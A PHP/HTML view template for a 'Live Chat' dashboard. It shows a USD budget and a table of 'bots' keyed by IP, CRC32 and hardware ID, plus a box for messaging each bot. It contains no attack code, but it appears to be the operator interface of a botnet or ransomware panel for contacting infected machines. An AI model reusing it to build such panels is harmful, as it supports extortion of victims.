<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 9/28/14
 * Time: 8:35 PM
 */
?>


  <div class="main-panel">
         <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-absolute navbar-transparent">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <div class="navbar-minimize d-inline">
              <button class="minimize-sidebar btn btn-link btn-just-icon" rel="tooltip" data-original-title="Sidebar toggle" data-placement="right">
                <i class="tim-icons icon-align-center visible-on-sidebar-regular"></i>
                <i class="tim-icons icon-bullet-list-67 visible-on-sidebar-mini"></i>
              </button>
            </div>
            <div class="navbar-toggle d-inline">
              <button type="button" class="navbar-toggler">
                <span class="navbar-toggler-bar bar1"></span>
                <span class="navbar-toggler-bar bar2"></span>
                <span class="navbar-toggler-bar bar3"></span>
              </button>
            </div>
            <a class="navbar-brand" href="javascript:void(0)">Live Chat</a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-bar navbar-kebab"></span>
            <span class="navbar-toggler-bar navbar-kebab"></span>
            <span class="navbar-toggler-bar navbar-kebab"></span>
          </button>
          <div class="collapse navbar-collapse" id="navigation">
            <ul class="navbar-nav ml-auto">
                <li class="navbar-wrapper">
                    <?=$data['userdata']->budget?> USD
                </li>
<!--              <li class="search-bar input-group">-->
<!--                <button class="btn btn-link" id="search-button" data-toggle="modal" data-target="#searchModal"><i class="tim-icons icon-zoom-split"></i>-->
<!--                  <span class="d-lg-none d-md-block">Search</span>-->
<!--                </button>-->
<!--              </li>-->
<!--              <li class="dropdown nav-item">-->
<!--                <a href="javascript:void(0)" class="dropdown-toggle nav-link" data-toggle="dropdown">-->
<!--                  <div class="notification d-none d-lg-block d-xl-block"></div>-->
<!--                  <i class="tim-icons icon-sound-wave"></i>-->
<!--                  <p class="d-lg-none">-->
<!--                    Notifications-->
<!--                  </p>-->
<!--                </a>-->
<!--                <ul class="dropdown-menu dropdown-menu-right dropdown-navbar">-->
<!--                  <li class="nav-link">-->
<!--                    <a href="#" class="nav-item dropdown-item">Mike John responded to your email</a>-->
<!--                  </li>-->
<!--                  <li class="nav-link">-->
<!--                    <a href="javascript:void(0)" class="nav-item dropdown-item">You have 5 more tasks</a>-->
<!--                  </li>-->
<!--                  <li class="nav-link">-->
<!--                    <a href="javascript:void(0)" class="nav-item dropdown-item">Your friend Michael is in town</a>-->
<!--                  </li>-->
<!--                  <li class="nav-link">-->
<!--                    <a href="javascript:void(0)" class="nav-item dropdown-item">Another notification</a>-->
<!--                  </li>-->
<!--                  <li class="nav-link">-->
<!--                    <a href="javascript:void(0)" class="nav-item dropdown-item">Another one</a>-->
<!--                  </li>-->
<!--                </ul>-->
<!--              </li>-->
              <li class="dropdown nav-item">
                <a href="#" class="dropdown-toggle nav-link" data-toggle="dropdown">
                  <div class="photo">
                      <img src="<?php echo base_url()."upload/avatar/".$data['userdata']->member_avatar?>">
                  </div>
                  <b class="caret d-none d-lg-block d-xl-block"></b>
                  <p class="d-lg-none">
                    Log out
                  </p>
                </a>
                <ul class="dropdown-menu dropdown-navbar">
                    <li class="nav-link">
                        <a href="<?php echo $data['menu_url']."/profile";?>" class="nav-item dropdown-item">Profile</a>
                    </li>
                    <li class="dropdown-divider"></li>
                    <li class="nav-link">
                        <a href="<?php echo base_url()."index.php/user/login/logout";?>" class="nav-item dropdown-item">Log out</a>
                    </li>
                </ul>
              </li>
              <li class="separator d-lg-none"></li>
            </ul>
          </div>
        </div>
      </nav>
<!--      <div class="modal modal-search fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModal" aria-hidden="true">-->
<!--        <div class="modal-dialog" role="document">-->
<!--          <div class="modal-content">-->
<!--            <div class="modal-header">-->
<!--              <input type="text" class="form-control" id="inlineFormInputGroup" placeholder="SEARCH">-->
<!--              <button type="button" class="close" data-dismiss="modal" aria-label="Close">-->
<!--                <i class="tim-icons icon-simple-remove"></i>-->
<!--              </button>-->
<!--            </div>-->
<!--          </div>-->
<!--        </div>-->
<!--      </div>-->
      <!-- End Navbar -->
      <div class="content full-height">
        <div class="row full-height">
          <div class="col-12 full-height">
            <div class="card card-chart full-height" style="overflow: scroll;">
              <div class="row full-height">
                  <div class="col-md-5 full-height">
                  	 <div class="pad-10px">
                  	  <div class="form-check pull-left">
	                    <label class="form-check-label">
	                      <input class="form-check-input" type="checkbox"id= "unread_msg_id" name="optionCheckboxes">
	                      <span class="form-check-sign"></span>
	                      Show Bots With UnRead Messsage
	                    </label>
	                  </div>
                  	</div>
                      <input id="userid" value="<?php echo $data['userdata']->member_id;?>" type="hidden">
                      <div class="pad-10px" style="margin-top:30px;">
                        <table id="datatable" class="table table-striped text-center" >
                            <thead >
                            <tr>
                                <th>Country/IP</th>
                                <th>CRC32</th>
                                <th>CreatedAt</th>
                                <th>Action</th>
                                <th>hwid</th>
                            </tr>
                            </thead>
                        </table>
                      
                      </div>
                  </div>
                  <div class="col-md-7 full-height">
                      <div class="pad-10px full-height">
                          <div class=" pad-b-50px full-height position-relative">
                              <h4 id="id-crc32" > </h4>
                              <div class="back-black overflow-y-scroll overflow-x-hidden" style="height:90%;" id="message-box">

                              </div>
                              <input id="message_content" type="text" class="form-control position-absolute bottom-0" placeholder="Type Your Message Here">
                              <button type="button" class="btn btn-icon position-absolute bottom-0 margin-0 right-0 width-unset" onclick="onMessageSend()">&nbspSend&nbsp</button>
                          </div>
                      </div>
                  </div>
              </div>
            </div>
          </div>
        </div>
      </div>
  
   
  </div>
 